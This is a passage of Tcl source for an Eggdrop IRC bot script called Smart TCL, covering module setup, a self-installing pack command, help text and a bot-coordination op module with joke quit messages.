	"loaded" { if {[info exists $l] && [expr $$l]} { return 1 } else { return 0 } }
	"unloaded" { 
	    if {![info exists $l] || ([info exists $l] && ![expr $$l])} { return 1 } else { return 0 }
	}
	default { return "[get:module:status loaded] - [get:module:status unloaded]" }
    }
}

proc setup:+module {h i m} {
    set n "set m \"$m\" ; # Module command (and name, minuscule short single word)"
    append n {
global bnick ${m}_module_name ${m}_module_init ${m}_module_bind ${m}_module_loaded ${m}_noconf_commands}
    set v "\nset \${m}_module_name \"[string totitle $m] Extension\" ; # Module Description (very short module description, like \"Crontab Manager\")"
    append n $v ; unset v
    append n {
set ${m}_module_bind "m|m" ; # Interface bindings
# All module commands which will have an help entry, in the format {bind_kind name flags}
# Example: {dcc mprot n} {msg !ping o|o} ..
set ${m}_help_list "{dcc $m m|m} {dcc m${m} m|m}"
# All module vars: {var_name read-only_flag value description kind override_flags notes no-logs_flag}..
# kind : in the format "%type1[,%typeN]:range1[|other][,rangeN[|other]]:index_type:index_range".
# %type can be %d -> numbers, %k -> constants, %c -> valid channels (or 'all'), %f -> flags, %l -> files,
# %p: passwords ('%p::1' -> passwords will be encrypted before storing), %n -> nicknames, %s -> option list
# range: for %type=%d: lowest highest[|other1 other2 other3 ...] ; for %type=%k: value1 value2 value3 ...
# %l: alternatives, other: any string; preceded by "_": next parameters are not mandatory (Ex.: "0 9|_off")
# Example1: {standard 0 10 "Standard Text Color" "%d:0 255"}
# Example2: {limit(all) 0 "3 5" "Chan Limit" "%d,%d:1 30|_off,1 10:%c" "n" "Use carefully!"}
}
    set v "set \${m}_module_init {\n\t{ver 1 \"0.1\" \"Version\"}\n\t{author 1 \"$h\" \"Author\"}\n}"
    append n $v ; unset v
    append n {
# Other commands which do not require config_file entries, like 'sync' in SOP module ('.sop sync')
# format: {command single-only-interface_flag no-logs_flag}
set ${m}_noconf_commands {
    
}

module_init $m ; eval [module_globals $m] ; # Module initialization

# This script determines 'what' are your module-vars.
# Ex: on $m_module_init: {timeout(all) 0 10 "Ban Timeout" "%d:1 120"} ->you want this value to be 'minutes'
# h=handle, m=module_name, v=var_name(timeout), a=array_arg(all), n=param_num(0), w=calling_proc
# w: calling_proc: status=invoked by '.mod (-v)', parse=bye '.mod timeout value', info=by '.mod timeout'.
# If in all cases you want to be displayed 'minutes', just change '$r' value, or you can select your case..
proc ${m}_what_script {h m v a n w} {
    eval [module_globals $m] ; set r ""
    switch -exact -- $w {
	"status" {}
	"parse" {}
	"info" {}
	default {}
    }
    return $r
}

# Module Setup Procedure, to set values for parameters, call your procs/scripts, save config, log, etc..
# h = handle, i = idx (=0 when proc is executed on remote bots), m = module_name, l = 1:local bot, 0:remote
# G = list of target bots for bot sending command (and sender bot when proc is executed on remote bots)
# g = symbolic target bots indication (like 'ALL connected bots' or 'W bots', or 'bot1'..); y = if l==1 and
# I have to execute command then y=1; w = command_name, p = parameter(s).
# Uncomment '#al testing..' and make some test to see what's happening!
proc ${m}_module_setup {h i m l G g w p} {
    global bnick ; set a [module_array_vars $m] ; set y [local:for:me $G] ; eval [module_globals $m]
    #al "testing ${m}_module_setup" "h=$h, i=$i, m=$m, l=$l, G=$G, g=$g, y=$y, w=$w, p=$p, array_vars=$a"
    switch -exact $w {
	default { module_save_changes $h $i $m $l $G $g $w $p $a }
    }
}

al init "[module_name $m] (version [expr $${m}_ver]) loaded and ready!"; set ${m}_module_loaded 1; unset m}
global wdir ; set f $wdir/smart.$m.tcl
if {[file exists $f]} {
    return "Found source file for new module '[c m]$m[c]' on file '[c m]$f[c]': using it!"
}
set d [open $f w]; puts $d $n; close $d; unset n; set r "Created module '[c m]$m[c]' on file '[c m]$f[c]'"
if {$i != 0} {
    append r ": now just edit that file to build your module! You can use '[c l].setup[c]' and '[c l].setup info $m[c]' to check new configuration, and try your new module with '[c m].$m[c]', '[c m].$m -v[c]', or '[c m].m$m[c]' mass interface, enjoy! ;)"
}
return $r
}

proc setup:+module_help {h i m} {
    set f ${m}_help_file ; global help-path $f ; set $f [file join ${help-path} smart.$m.help]
    set q [string totitle $m] ; set n "%{help=$m}%{+m|+m}"
    append n "\n\#\#\#  %b.$m%b\n   Standard Interface to $q Module."
    append n "\n   Displays module status and saved settings."
    append n "\nSee also: .m${m}"
    append n "\n\#\#\#  %b.$m -v%b\n   Displays module status, complete command list and quick-help."
    append n "\n\#\#\#  %b.$m ver%b\n   Displays $q Module version."
    append n "\n\#\#\#  %b.$m author%b\n   Displays informations about Module Author."
    append n "\n\#\#\#  %b.$m clear%b\n   Removes $q configuration file.\nSee also: '.help clear'"
    append n "\n%{help=m${m}}%{+m|+m}\n\#\#\#  %b.m${m}%b ...\n   Standard Mass interface for $q Module."
    append n "\nSee also: '.help mass'"
    if {[file exists [expr $${f}]]} {
	return "Found Help file for new module '[c m]$m[c]' on file '[c m][expr $${f}][c]': using it!"
    }
    set d [open [expr $${f}] w]; puts $d $n; close $d ; unset n
    set r "Created Help for module '[c m]$m[c]' on file '[c m][expr $${f}][c]': now just edit that file to meet your '[c m].help $m[c]' and '[c m].help m${m}[c]' needs! ;)"
    return $r
}
# Known: does not log anything locally when '.msetup otherbot do something'
proc setup:do {h i G g m l w M} {
    eval [module_globals $m] ; global bnick wdir help-path
    set r "module '[c m][b]$M[b][c]'" ; if {!$l} { set i 0 }
    switch -exact -- $w {
	"load" - "unload" {
	    set q [get:module:status exists $M] ; if {[string match "Unknown*" $q]} { return "{$q}" }
	    if {$w == "load"} {
		set ${m}_want($M) 1; set r "{[c o]Loaded[c] $r}"; set R "Loaded module '$M'"
		$m:save $M; if {$M != "help"} { $m:load help }
	    } else {
		set r "{[c e]Unloaded[c] $r}"; set R "Unloaded module '$M'"
		if {[lsearch -exact $setup_pmods $M] != -1 } {
		    if {$M == "setup"} {
			set r "{[warn] Sorry, you are trying to remove [c l]Setup System[c]: operation not allowed}"
			return $r
		    }
		    append r " {[warn] Removing [c m][b]$M[b][c] module will drastically reduce TCL performance..}"
		}
		set ${m}_want($M) 0 ; if {$M == "help"} { unloadhelp smart.help } ; $m:save $M
		append r " {To make changes take effect, now you have to '[c o].brestart $bnick[c]'!}"
	    }
	    if {$l} {
		if {[strl $G] != [strl $bnick]} { append R " on $g" }
		append R ": Authorized by $h."
	    } else { append R ": requested by $h (from $G)" }
	    al $m $R
	}
	"info" { set r "{[setup:info $M 1]}" }
	"loaded" - "unloaded" - "status" {
	    if {$w == "status"} { set M "" } ; set r [get:module:status $w $M]
	    if {$M != ""} {
		if {$r} { set c o ; set q "yes" } else { set c e ; set q "no" }
		set r "[c m]Module[c] '[c m][b]$M[b][c]'[c m] $w:[c] [c $c][b]$q[b][c]"
	    }
	    return "{$r}"
	}
	"+module" {
	    if {[lsearch -exact [$m:mods] $M] != -1} {
		return "{Sorry, module '[c m]$M[c]' already exists.. Try '[c l].$m[c]' to have a report!}"
	    }
	    set r "{[setup:+module $h $i $M]} {[setup:+module_help $h $i $M]}"
	    lappend ${m}_umods $M ; set ${m}_want($M) 1 ; $m:save $M ; set R "Added module '$M'"
	}
	"-module" {
	    if {[lsearch -exact $setup_amods $M] != -1} {
		return "{Sorry, you can not remove Smart modules.. Try '[c l].$m[c]' to have a report!}"
	    }
	    set n [lsearch -exact $setup_umods $M]
	    if {$n == -1} {
		return "{Sorry, I can 't find module '[c m]$M[c]'.. Try '[c l].$m[c]' to have a report!}"
	    }
	    set setup_umods [lreplace $setup_umods $n $n] ; unset ${m}_want($M)
	    $m:save ; set f $wdir/smart.$M.tcl
	    set r "Module '[c m]$M[c]' has been [c e]removed[c] from list."
	    if {$l} {
		append r " It will no longer be distributed as part of the TCL. To make changes take effect, you need to '[c l].restart[c]' your bot now. Please, note also that the module (and relative help) has not been phisically removed from disk: if you want so, you have to perform a '[c l].rm $f[c]' and '[c l].rm [file join ${help-path} smart.$M.help][c]' manually."
	    }
	    set R "Removed module '$M'"
	}
	default {}
    }
    if {$l} {
	if {[strl $G] != [strl $bnick]} { append R " on $g" } ; append R ": Authorized by $h."
    } else { append R ": requested by $h (from $G)" }
    al $m $R ; return $r
}

global ${m}_nmods
if {[info exists ${m}_nmods]} {
    set o [$m:mods]
    foreach f [expr $${m}_nmods] { if {[lsearch -exact $o $f] == -1} { lappend ${m}_umods $f; $m:save $f }}
    unset ${m}_nmods o
}
$m:want:update
proc pack {w h i k} {
    global wdir pa setup_amods setup_umods help-path
    set pa($i) $k ; set t [findtclfile]
    if {$t == ""} { al "error" "Unable to find smart.tcl primary files, can not pack TCL !" ; return -1 }
    if {[file exists $w]} {
	if {[catch {file copy -force $w $w.bak} f_err] != 0} {
	    pa $i "Sorry, error while trying to create backup-copy of existing '$w' : [b]$f_err[b]"
	    pa $i "Operation aborted.. :o(" ; return -1
	}
	pa $i "File '$w' exists : created backup copy '$w.bak'.. ;)"
    }
    pa $i "Packing TCL modules to file [b]$w[b].."
    set inst {
########################################### Installation Stuff ###########################################
putlog "Installing Smart TCL ..." ; set wdir "smartTCL" ; global help-path ; set t [findtclfile]
if {$t == ""} { set t "smart.tcl" }
if {![file exists $wdir] || ![file isdirectory $wdir]} {
    file mkdir $wdir ; file attributes $wdir -permissions 00700
}
if {![info exists help-path] || ${help-path} == ""} { set help-path "help/" }
if {![file exists ${help-path}] || ![file isdirectory ${help-path}]} {
    file mkdir ${help-path} ; file attributes ${help-path} -permissions 00700
}
}
set mods "set setup_nmods \"[setup:mods]\"" ; append inst $mods ; unset mods
append inst {
foreach m $setup_nmods {
    set mv smart_${m} ; set ms ${m}_module_script ; set mh smart_${m}_help
    set $ms "$wdir/smart.$m.tcl" ; set fd [open [expr $${ms}] w]
    fconfigure $fd -translation auto ; puts -nonewline $fd [expr $${mv}] ; close $fd ; unset $mv
    if {[info exists $mh]} {
	set hf [file join ${help-path} "smart.$m.help"] ; set fd [open $hf w]
	fconfigure $fd -translation auto ; puts -nonewline $fd [expr $${mh}] ; close $fd
	unset hf ; unset $mh
    }
}
if {[info exists smart_news]} {
    set fd [open "$wdir/smart.news" w] ; fconfigure $fd -translation auto
    puts -nonewline $fd $smart_news ; close $fd ; unset smart_news
}
set fd [open $t w] ; fconfigure $fd -translation auto
puts -nonewline $fd $smart_core ; close $fd ; unset smart_core ; after 3000 ; source $t
##########################################################################################################
}
    set fd [open $t r] ; fconfigure $fd -translation auto ; set buf [read $fd] ; close $fd
    file delete -force $w ; set fo [open $w w] ; fconfigure $fo -translation binary
    puts -nonewline $fo "set smart_core {" ; puts -nonewline $fo $buf ; puts $fo "}"
    foreach m [setup:mods] {
        set q "set smart_${m} {" ; puts -nonewline $fo $q ; set ms ${m}_module_script ; global $ms
	if {![file exists [expr $${ms}]]} {
	    pa $i "[b]Warning!!![b] Necessary file [expr $${ms}] not found : can not pack TCL from this bot, please choose a botnet hub with the complete version of smart.tcl to pack it!"
	    close $fo ; file delete -force $w
	    if {[file exists $w.bak]} { file copy -force $w.bak $w ; file delete -force $w.bak } ; return -1
	}
	set fd [open [expr $${ms}] r] ; fconfigure $fd -translation auto ; set buf [read $fd]
	close $fd ; puts -nonewline $fo $buf ; puts $fo "}"
        set hf [file join ${help-path} "smart.$m.help"]
        if {[file exists $hf]} {
	    set q "set smart_${m}_help {" ; puts -nonewline $fo $q
	    set mh ${m}_module_help ; global $mh
            set fd [open $hf r] ; fconfigure $fd -translation auto ; set buf [read $fd]
            close $fd ; puts -nonewline $fo $buf ; puts $fo "}"
	}
    }
    if {[file exists "$wdir/smart.news"]} {
        puts -nonewline $fo "set smart_news {" ; set fd [open "$wdir/smart.news" r] ; fconfigure $fd -translation auto
        set buf [read $fd] ; close $fd ; puts -nonewline $fo $buf ; puts $fo "}" ; unset buf
    }
    puts $fo "proc findtclfile {{f \"\"}} {" ; puts $fo [info body findtclfile] ; puts $fo "}"
    puts -nonewline $fo $inst ; close $fo ; unset inst
    al $k "Packed TCL modules to file[c n] $w[c]: Authorized by $h." ; return $w
}
bind dcc n pack dcc:pack
proc dcc:pack {h i a} {
    global pa lastbind
    set pa($i) $lastbind ; set w [bi $a 0] ; set c [bi $a 1]
    if {$w == ""} { pa $i "Usage: .$lastbind <dest-file> \[-c\]" ; return 0 }
    putcmdlog "\#$h\# $lastbind $w $c" ; set r [pack $w $h $i $lastbind]
    if {[file exists $r]} {
	if {$c == "-c"} {
	    if {[hascompress]} {
		pa $i "Compressing $w to $w.gz .." ; compressfile -level 9 $w $w.gz ; file delete -force $w
		al $lastbind "Packed and compressed TCL installer to $w.gz : distribution ready!"
	    } else {
		pa $i "Compression module not available : leaving data uncompressed.."
		al $lastbind "Packed TCL installer to $w : distribution ready!"
	    }
	} else { al $lastbind "Packed TCL installer to $w : distribution ready!" }
    } elseif {$r == -1} { pa $i "Fatal error, operation aborted.." }
}

proc ${m}_module_setup {h i m l G g w p} {
    global bnick ; set a [module_array_vars $m] ; set y [local:for:me $G] ; eval [module_globals $m]
    #al "testing ${m}_module_setup" "h=$h, i=$i, m=$m, l=$l, G=$G, g=$g, y=$y, w=$w, p=$p, array_vars=$a"
    if {$p == "" && [lsearch -exact "loaded unloaded status" $w] == -1} {
	if {$l} { pa $i "Usage: '.$m $w <[c m][b]module[b][c]>'" } ; return 0
    }
    if {($l && $y) || !$l} {
	set r "$h $i module_status_report [setup:do $h $i $G $g $m $l $w $p]"
	if {$l} { bot:module_interface $bnick 0 $r } else { putbot $G "$m $r" }
    }
    # module_save_changes $h $i $m $l $G $g $w $p $a
}

al init "[module_name $m] (version [expr $${m}_ver]) loaded and ready!"; set ${m}_module_loaded 1; unset m}
set smart_setup_help {%{help=setup}%{+m|+m}
###  %b.setup%b
   Shows all Smart TCL modules status with some extra information.
###  %b.setup ver%b
   Displays Setup Module version.
###  %b.setup author%b
   Displays informations about Module Author.
###  %b.setup clear%b
   Removes Setup configuration file.
See also: '.help clear'
###  %b.setup load%b <module>
   Loads specified module.
See also: .setup unload, .setup loaded, .setup unloaded, .setup status
###  %b.setup unload%b <module>
   Unloads specified module.
Note1: a '.restart' is needed for changes to take effect.
Note2: there are 4 primary modules: 'sop', 'prot', 'nick' and of
       course 'setup' (see '.setup pmods'): it is very dangerous
       to unload one of these modules (unloading setup is denied
       at all), Smart TCL performance will be drastically reduced
       and error messages like 'xxxx: command not found' will be
       introduced: never do that unless you know what you're doing!
See also: .setup load, .setup loaded, .setup unloaded, .setup status
###  %b.setup loaded%b [modulename]
   Shows a list of loaded modules. If a modulename is specified as
   parameter, checks for that module loaded.
See also: .setup unloaded, .setup status
###  %b.setup unloaded%b [modulename]
   Shows a list of unloaded modules. If a modulename is specified
   as parameter, checks for that module unloaded.
See also: .setup loaded, .setup status
###  %b.setup status%b
   Displays a report of all loaded and unloaded modules.
See also: .setup loaded, .setup unloaded
###  %b.setup +module%b <modulename>
   Creates 'modulename' module and integrates it with the rest of
   the TCL as a User Module (see '.setup umods'), already working
   with standard single and mass interfaces (you can use immediately
   '.modulename' and '.mmodulename' commands as any other TCL module
   like '.prot'). You have to edit your new module (which you can
   find on smartTCL/smart.modulename.tcl) to customize it and add
   functionality to it. Just follow commented instructions to start!
   An help file is also builded (on help/smart.modulename.help,
   see '.help modulename'), which you can edit to add help entries
   to your new module. From now on, when you use '.pack' command
   or '.upgrade', your new module will be included in standard TCL
   distribution.
See also: .setup -module <modulename>, .pack
###  %b.setup -module%b <modulename>
   Removes 'modulename' module from TCL distribution. You have to
   '.restart' your bot to make changes take effect.
Note1: modulename files will not be deleted, you can still find 'em
       on smartTCL/smart.modulename.tcl and help/smart.modulename.help
       so you can reuse it in the future if you want to reuse the code.
       To remove also these files, just use the '.rm' command from pl.
Note2: it is only possible to remove User modules (see '.setup umods')
       while it is not allowed to remove standard Smart modules (see
       'setup amods').
See also: .setup +module <modulename>, .pack, .rm, .ls, .find
###  %b.setup info%b <modulename>
   Shows extra informations about specified module.
See also: .msetup
%{help=msetup}%{+m|+m}
###  %b.msetup%b ...
   Standard Mass interface for Setup Module.
See also: '.help mass'
%{help=pack}%{+n}
###  %b.pack%b <destination-file> [-c]
   Packs all Smart.tcl components to an installer TCL file ready to be
   sent to other bots either uncompressed or compressed in .gz format (if
   -c option is specified).
See also: .upgrade, .mupgrade, .send, .msend, .setup}
set smart_sop {set m "sop"
global bnick ${m}_module_name ${m}_module_init ${m}_module_bind ${m}_module_loaded ${m}_noconf_commands
global sop_jq sop_jq_default sop_m strict-host
set strict-host 0
set ${m}_module_name "Smart Op"
set ${m}_module_bind "t|m"
set ${m}_help_list "{dcc $m t|m} {dcc m${m} t|m} {dcc botserv t|m} {dcc check o|o} {dcc sync o|o} {dcc cycle m|m} {dcc mcycle m}"
# {0=var_name 1=read-only_flag 2=value 3=description 4=kind 5=override_flags 6=notes 7=no-log_flag}
set ${m}_module_init {
    {ver 1 "4.7" "Version"}
    {author 1 "^Boja^ <boja@avatarcorp.org>" "Author"}
    {log 0 "off" "Verbose Logging" "%k:on off"}
    {aa 0 "hosts" "Auto Add Type" "%k:off hosts all" n "Use 'all' while linking new bots/nets, 'hosts' otherwise"}
    {bh 0 2 "Max Bots Hosts" "%d:1 20|off" t}
    {myhub 1 "-" "My Botnet HUB" "%k,%k::"}
    {fhl 0 "off" "Forced Hub Linking" "%d:30 300|off" t}
    {ajump 0 "off" "Bots Auto Jump" "%d:1 72|random off" t}
    {ajgap 0 120 "Auto Jump Gap" "%d:10 600|off" t}
    {red 0 2 "Requests Redundancy" "%d:1 10" t}
    {scycle 0 5 "Single Cycling Time" "%d:1 60" t "This is used by single bots when you use '.cycle' command"}
    {bcycle 0 20 "Botnet Cycling Time" "%d:5 300" t "This is used by entire botnet when you use '.mcycle' command or during auto-cycling routines"}
    {delay 0 2 "Group Modes Delay" "%d:1 7|off" t "High values will result in a non-responsive botnet (suggested range: 2 - 4), and don 't use 'off' if you don 't really know what you 're doing!"}
    {rj 0 "off" "Remote Joins" "%k:on off" n}
    {quits 0 "default" "Quits File" "%l:default" n}
}
# {cmd single-f nolog-f}
set ${m}_noconf_commands {
    cycle botserv check onchan sync {autoclean 0 1}
}
module_init $m ; eval [module_globals $m]
proc ${m}_what_script {h m v a n w} {
    eval [module_globals $m] ; set r ""
    switch -exact -- $v {
	"bh" { if {$w == "parse"} { set r "hosts"} }
	"ajump" {
	    if {[lsearch -exact "off random" $sop_ajump] ==-1 || $w == "parse"} { set r "hours" }; set T ""
	    if {[lsearch -exact "status info" $w] != -1 && $sop_ajump != "off"} {
		foreach t [timers] { if {[lindex $t 1] == "auto_jump"} { set T [lindex $t 0] ; break } }
		if {$T != ""} { append r " (next: [expr $T/60]h[expr $T - ($T/60) * 60]m)" }
	    }
	}
	"ajgap" { if {$sop_ajgap != "off" || $w == "parse"} { set r "minutes" } }
	"red" { set r "requests" }
	"scycle" - "bcycle" { set r "seconds" }
	"delay" - "fhl" { set V ${m}_$v ; if {[expr $$V] != "off" || $w == "parse"} { set r "seconds" } }
	"myhub" {
	    if {$n == 0} { set k "primary" } else { set k "alternate" }
	    set r "($k" ; set b [lindex $sop_myhub $n]
	    if {$b != "-"} {
		if {[islinked $b]} { set q ",[c o] linked[c]" } else { set q ",[c q] not linked[c]" }
		append r $q
	    }
	    append r ")"
	}
	default {}
    }
    return $r
}
proc ${m}:addmyself {} {
    global bnick
    if {![matchattr $bnick b]} {
	set d [split [myaddr] @] ; addbot $bnick [bi $d 0]:[bi $d 1]/[bi $d 2]
	chattr $bnick efo ; al sop "Added myself ($bnick) to the userfile.."
    }
}
utimer 10 ${m}:addmyself
set sop_jq_default {
    "Broken pipe" "Connection reset by peer" "Connection timed out" "Read error: 0 (Error 0)"
    "EOF From client" "I Quit" "Leaving" "Connection refused" "Network unreachable"
    "No route to host" "Operation timed out" "SendQ exceeded" "Idle time limit exceeded"
    "Client Quit" "Ping timeout" "Hey!  Where'd my controlling terminal go?"
    "Ping timeout: 120 seconds" "Ping timeout: 240 seconds" "Ping timeout: 180 seconds"
    "Read error: 32 (Broken pipe)" "Changing Servers" "BitchX-75p1 -- just do it."
    "BitchX-75p2 -- just do it." "BitchX-75p3 -- just do it." "Bye Bye to all!"
    "Read error: 54 (Connection reset by peer)" "I have no reason"
    "Idle time limit exceeded" "I need a shower" "Looking for my dildo" "Watching a porn"
    "I 'm loosing my blinda.. :o(" "Oh shit, I can't find my antani!!" "Tomorrow never die"
    "Hey, where is my bamboble?!" "Wanna see my fenula? :)" "Foffo is more than sex!!!"
    "Kiss my ass!" "I don't want love, I need it.." "See you later!!" "Burn Baby Burn"
    "See you next time! :)" "Bye bye friends!" "Will you miss me ? :)" "I did nothink! :o?"
    "Where I am going? I don't really know.." "Sorry all, sorry.." "I need the toilet !!! >:-|"
    "Pwho !!! >:-o" "I 'll come again, don 't worry! :)" "I can 't understand 'tarapia-tapioca',sorry.. :("
    "Never fight with me.." "Will you remember my ass or my brain? :)" "I must play with myself now ^_^"
    "Just another shadow in the night.." "Game Over!!!" "Pizza time!!! :D" "Sleeping time.."
    "Where the hell is my banana??" "Have you never seen a giant Biscamburri?!" "Besbo.."
    "Verus Amicus est tamquam Alter Idem" "In omnia pericula tasta testicula"
    "Testicula tacta omnia mala fugent"
}
proc load_quits {} {
    global sop_quits sop_jq sop_jq_default
    if {$sop_quits == "default"} { set sop_jq $sop_jq_default ; return 0 }
    set f [file_try $sop_quits r]
    if {$f == 0} {
	al sop "[warn] Quits-file [b]$sop_quits[b] [c e]does not exist[c]!Reverting to [c o]defaults[c].."
	set sop_quits "default"; module_save sop; load_quits; return 0
    }
    set sop_jq ""; while {![eof $f]} { set s [gets $f]; if {[eof $f]} { break }; lappend sop_jq "$s" }
    close $f
    if {[llength $sop_jq] < 1} {
	al sop "[warn] [c e]No Quit-phrases[c] found in Quit-file [b]$sop_quits[b]! Reverting to [c o]defaults[c].."
	set sop_quits "default"; module_save sop; load_quits
    }
}
load_quits
proc smart:jump {h i a} {
    foreach t [utimers] { if {[lindex $t 1] == "jump"} { killutimer [lindex $t 2] } } ; smart_quit
    if {$a != ""} { utimer 4 "*dcc:jump $h $i [list $a]" } else { putcmdlog "\#$h\# jump" ; utimer 4 jump }
}
proc rebind_jump {} {
    global errorInfo
    if {[info exists errorInfo] && $errorInfo != ""} { set o $errorInfo }
    catch { unbind dcc - jump *dcc:jump } e ; bind dcc t jump smart:jump
    if {[info exists o]} { set errorInfo $o } else { set errorInfo "" }
}
rebind_jump
### Da qui: controllare ke c siano bots op in canale prima d saltare
proc auto_jump {} {
    global sop_ajump sop_ajgap ; if {$sop_ajump == "off"} { return 0 }
    foreach t [timers] { if {[lindex $t 1] == "auto_jump"} { return 0 } }
    if {$sop_ajump == "random"} { set q [expr 360 + [rand 240]] } else { set q $sop_ajump }
    if {$sop_ajgap != "off"} { set q [expr $q + [rand $sop_ajgap]] }
    if {[llength [bots]] > 0} { smart_quit; al sop "I'm auto jumping. Next jump in $q minutes! ;)" }
    timer $q auto_jump
}
proc ajump_check {} {
    global sop_ajump sop_ajgap
    if {$sop_ajump == "off"} {
	foreach t [timers] { if {[lindex $t 1] == "auto_jump"} { killtimer [lindex $t 2] } }
    } else {
	if {![string match *auto_jump* [timers]]} {
	    if {$sop_ajump == "random"} { set q [expr 360 + [rand 240]] } else { set q [expr 60 * $sop_ajump] }
	    if {$sop_ajgap != "off"} { set q [expr $q + [rand $sop_ajgap]] }
	    timer $q auto_jump
	}
    }
    foreach t [timers] { if {[lindex $t 1] == "ajump_check"} { killtimer [lindex $t 2] } }
    timer [expr 10 + [rand 10]] ajump_check
}
ajump_check
proc soplog {t} { global sop_log ; if {$sop_log == "on" || [string match *Added* $t]} { al sop $t } }
proc chan_desynch {{s ""} {t ""} {w ""}} { soplog "Channel [c n]desynch[c] from [c n]$s[c]: $t" }
proc sop:go {n uh h a} {
    global sop_bcycle ; set c [strl [lindex $a 0]]
    if {[validchan $c]} {
	if {[string match "*-inactive*" [channel info $c]] && [botonchan $c] && ![botisop $c]} {
	    al sop "Auto-cycling channel $c ($sop_bcycle seconds) to regain ops!"
	    sop:cycle $c $sop_bcycle 0
	}
    }
    if {[bots] != ""} { putallbots "mcycle $c $sop_bcycle $h" }
}
proc bot:rjoin {b cm a} {
    global sop_rj ; if {$sop_rj != "on" || ![matchattr $b b]} { return 0 } ; set f [getuser $b BOTFL]
    if {[string match *s* $f] || ([string match *h* $f] && [string match *p* $f])} {
	if {[string match *p* $f]} { set q "primary HUB" } else { set q "sharebot" }
	set C [lindex $a 0] ; set I [lindex $a 1]
	foreach c $C {
	    if {![validchan $c]} {
		al sop "Adding channel [c o]$c[c] (received [c o]remote join[c] from $q [c o]$b[c])"
		channel add $c ; if {[lsearch -exact $I $c] != -1} { channel set $c +inactive }
	    }
	}
    }
}
proc link:rjoin {b h} {
    global bnick
    if {$b == $bnick || ![matchattr $b b]} { return 0 } ; set f [getuser $b BOTFL]
    if {[string match *s* $f] || ([string match *h* $f] && [string match *p* $f])} {
	set r [strl [channels]] ; set R ""
	foreach c $r { if {[string match *+inactive* [channel info $c]]} { lappend R $c } }
	putbot $b "rjoin {$r} {$R}"
    }
}
proc rjoin_change {} {
    global sop_rj
    if {$sop_rj == "on" && ![string match *link:rjoin* [binds]]} {
	bind link - * link:rjoin
    } elseif {$sop_rj == "off" && [string match *link:rjoin* [binds]]} { unb link * link:rjoin }
}
rjoin_change
proc smartbot {n {c ""}} {
    if {[llength [bots]] == 0} { return "" }
    if {$c != "" && ![validchan $c]} { set c "" } ; set l "" ; set a "" ; set r "" ; set q ""
    if {$c == ""} {
	foreach b [bots] { if {[matchattr $b b]} { lappend l $b } ; lappend a $b }
    } else {
	foreach b [bots] {
	    if {[handonchan $b $c]} {
		if {[isop [hand2nick $b $c] $c]} { if {[matchattr $b b]} { lappend l $b } ; lappend a $b }
		lappend r $b
	    }
	    lappend q $b
	}
    }
    #if {![validchan $c] || ([validchan $c] && ![botonchan $c])} { set n [expr 2 * $n] }
    if {$l == ""} { set l $a } ; if {$l == ""} { set l $r } ; if {$l == ""} { set l $q }
    if {$l == ""} { return "" }
    if {$n >= [llength $l]} {
	if {$n >= [llength $a]} {
	    if {$c == ""} {
		return $a
	    } else {
		if {$n >= [llength $r]} {
		    if {$n >= [llength $q]} { return $q } else { set o $r ; set l $q }
		} else {
		    set o $a ; set l $r
		}
	    }
	} else {
	    set o $l ; set l $a
	}
    }
    if {![info exists o]} { set o "" } ; set j [llength $o]
    while {$j < $n} {
	set q [lindex $l [rand [llength $l]]] ; if {![string match *$q* $o]} { lappend o $q ; incr j }
    }
    return $o
}
proc sop_checkhost {b h} {
    global sop_bh ; if {![matchattr $b b] || $h == "none"} { return 0 }
    set h [wmh $h bot] ; if {$h == "none"} { return 0 } ; set l [llength [getuser $b HOSTS]]
    if {[lsearch -exact [getuser $b HOSTS] $h] == -1} { incr l } ; if {$l > $sop_bh} { setuser $b HOSTS }
    if {$l != [llength [getuser $b HOSTS]]} { addhost $b $h ; return 1 } ; return 0
}
proc sop:need {c w} {
    global botnick bnick server sop_red
    if {[bots] == ""} { soplog "I can't request any [c e]$w[c] .. [c e]No bots linked[c] :o(" ; return 0 }
    set o [smartbot $sop_red $c]
    switch -exact -- $w {
	"limit" - "invite" - "unban" - "key" - "op" {
	    set q $w ; set C $c ; set s 1
	    if {$w == "limit"} { append q " raise" } ; if {$w == "unban"} { append C " $bnick" }
	}
	"add" {
	    if {[validuser $bnick]} {
		regsub -all -- " " [getuser $bnick BOTADDR] "@" a
		if {$a != [myaddr]} {
		    set d [split [myaddr] @] ; setuser $bnick BOTADDR [bi $d 0] [bi $d 1] [bi $d 2]
		    save ; al sop "Changed my address to [c o][b][bi $d 0]:[bi $d 1]/[bi $d 2][b][c]"
		}
		if {![matchattr $bnick o] || ![matchattr $bnick f] || ![matchattr $bnick e]} {
		    chattr $bnick efo ; al sop "Changed my flags [c o][b]+befo[b][c] ;)"
		}
	    } else { sop:addmyself }
	    set myhost "none"
	    if {$server != ""} {
		foreach ch [channels] {
		    if {[botonchan $ch]} { set myhost [getchanhost $botnick $ch] ; break }
		}
	    }
	    sop_checkhost $bnick $myhost ; set f [chattr $bnick] ; set x [string index $f 0]
	    if {$x == "+" || $x == "-"} { set f [string range $f 1 end] }
	    if {$f == "*"} { set f "befo" }
	    soplog "Requesting add-check for myself on all linked bots ;)"
	    putallbots "sop:req add [myaddr] $myhost $f" ; set s 0
	}
	default { al sop "[warn] Unknown sop:need type: '[c e][b]$w[b][c]' :(" ; set s 0 }
    }
    if {$s} {
	soplog "Requesting[c n] $q[c] for[c n] $c[c] from:[c n] $o[c]"
	foreach b $o { putbot $b "sop:req $w $C $botnick" }
    }
}
proc sop:mode {c m {n ""} {d ""}} {
    global sop_delay sop_m modes-per-line
    foreach t [utimers] { if {[string match "*sop:mode $c*" [lindex $t 1]]} { killutimer [lindex $t 2] } }
    if {[info exists sop_m($c)]} {
	if {[lsearch -exact $sop_m($c) "$m $n"] == -1} { lappend sop_m($c) "$m [p_test $n]" }
    } else { set sop_m($c) "{$m [p_test $n]}" }
    if {$sop_delay == "off"} { set d "do" }
    if {$d == "do" || [llength $sop_m($c)] >= [expr ${modes-per-line}]} { lappend sop_m($c) "do" }
    if {![validchan $c]} { unset sop_m($c) ; return 0 } ; if {![botonchan $c]} { return 0 }
    if {[lindex $sop_m($c) end] == "do"} {
	set sop_m($c) [lrange $sop_m($c) 0 [expr [llength $sop_m($c)] - 2]]
	foreach k $sop_m($c) {
	    set M [bi $k 0] ; set N [bi $k 1] ; if {$M == "+o" && [isop $N $c]} continue
	    pushmode $c $M [join $N]
	}
	flushmode $c ; unset sop_m($c)
    } else { utimer $sop_delay "sop:mode [p_test $c] $m [p_test $n] do" }
}
proc sop:doreply {b c a} {
    global sop_log
    if {$sop_log == "on" || [string match *Added* $a] || [string match *aren* $a]} {
